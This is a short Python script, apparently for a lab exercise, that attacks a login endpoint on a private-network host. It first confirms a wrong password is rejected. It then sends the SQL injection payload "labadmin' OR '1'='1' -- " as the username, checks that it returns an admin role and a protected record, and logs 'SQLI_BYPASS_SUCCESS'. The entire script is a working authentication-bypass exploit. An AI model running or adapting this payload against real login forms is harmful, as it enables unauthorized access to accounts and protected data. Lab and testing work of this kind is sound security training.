#!/usr/bin/env python3
import json, urllib.request, urllib.error
from urllib.parse import urlencode
from pathlib import Path

root = Path.home()/'lab09'
root.mkdir(exist_ok=True)

url = 'http://172.29.109.20:8080/login'

def login(username,password):
    data = urlencode({
        'username':username,
        'password':password
    }).encode()

    req = urllib.request.Request(url,data=data)
    try:
        with urllib.request.urlopen(req,timeout=8) as r:
            return r.status,json.load(r)
    except urllib.error.HTTPError as e:
        return e.code,json.load(e)

status, response = login('labadmin','wrong-password')

if status != 401 or response.get('authenticated'):
    raise SystemExit('BASELINE_TEST_FAILED')

print('BASELINE_REJECTED')

payload = "labadmin' OR '1'='1' -- "
status, response = login(payload,'wrong-password')

if (
    status != 200
    or response.get('role') != 'admin'
    or response.get('record') != 'LAB09_INTERNAL_TEST_RECORD'
):
    raise SystemExit('SQLI_TEST_FAILED')

print('SQLI_BYPASS_SUCCESS')

(root/'attack.log').write_text(
    'BASELINE_REJECTED\n'
    'SQLI_BYPASS_SUCCESS\n'
    'PROTECTED_RECORD_ACCESSED\n'
)

print('LAB09_ATTACK_OK')
